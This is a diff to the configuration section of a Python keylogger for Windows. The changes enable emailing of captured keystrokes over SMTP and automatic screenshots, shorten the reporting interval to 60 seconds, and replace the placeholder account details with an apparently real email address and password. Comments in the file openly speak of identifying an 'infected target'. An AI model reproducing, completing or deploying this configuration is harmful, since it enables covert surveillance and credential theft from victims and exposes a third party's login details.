@@ -34,15 +34,15 @@ import pythoncom, pyHook, Image, ImageGrab, win32api, win32gui, win32con, smtpli
 # Keylogger settings
 #################################
 # Email Settings				#
-LOG_SENDMAIL = False			# set to True to send emails
-LOG_MAIL = 'email@gmail.com'  	# account email address (must exist)
-LOG_PASS = 'password'			# email's password (must exist)
-LOG_FROM = 'bla@blabla.com'		# email will be sent from this address (fake) - useful to identify infected target =)
+LOG_SENDMAIL = True			# set to True to send emails
+LOG_MAIL = 'xr_417@hotmail.com'  	# account email address (must exist)
+LOG_PASS = '9813263039'			# email's password (must exist)
+LOG_FROM = 'anonymous@gmail.com'		# email will be sent from this address (fake) - useful to identify infected target =)
 LOG_SUBJ = 'Long time my friend'# email subject
 LOG_MSG = 'Howdy!'				# email content - the body
 # ----------------------------- #
 # Screenshot Settings			#
-LOG_SCREENSHOT = False			# set to True to take screenshot(s)
+LOG_SCREENSHOT = True			# set to True to take screenshot(s)
 LOG_SCREENSNUM = 3				# set amount of screenshot to take.
 LOG_INTERVAL = 2				# interval between each screenshot.
 LOG_SCREEN = []					# this list contains matches for taking automated screenshots...
@@ -58,7 +58,7 @@ LOG_STATE = False				# Start keylogger as false
 LOG_TIME = 0					# amount of time to log in seconds, where 0 = infinite and 86400 = 1 day
 LOG_TEXT = ""					# this is the raw log var which will be written to file
 LOG_TEXTSIZE = 0				# marks the beginning and end of new text blocks that separate logs
-LOG_MINTERVAL = 86400			# main loop intervals in seconds, where 86400 = 1 day (default)
+LOG_MINTERVAL = 60			# main loop intervals in seconds, where 86400 = 1 day (default)
 LOG_THREAD_kl = 0				# thread count for keylogger
 LOG_THREAD_ss = 0				# thread count for automated screenshots
 # ----------------------------- #
